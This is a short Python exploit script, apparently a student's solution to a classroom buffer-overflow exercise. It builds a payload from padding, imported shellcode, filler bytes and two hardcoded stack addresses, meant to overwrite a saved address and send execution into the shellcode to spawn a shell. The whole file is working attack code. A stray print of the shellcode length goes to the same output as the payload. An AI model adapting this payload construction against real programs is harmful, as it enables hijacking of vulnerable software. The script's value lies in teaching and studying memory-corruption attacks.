#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here

# 0xfffed6d8 
# addr_shell = b'\xAA\xAA\xAA\xAA'
addr_shell = b'\xd8\xd6\xfe\xff'

# 0xfffed70c
# addr_EIP = b'\xFF\xFF\xFF\xFF'
addr_EIP = b'\x0c\xd7\xfe\xff'

print(len(shellcode))

pad = 2048-9
sys.stdout.buffer.write(b'\xFF'*(pad-len(shellcode)))
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b'\xDD'*9)
sys.stdout.buffer.write(addr_shell)  # a
sys.stdout.buffer.write(addr_EIP)  # p
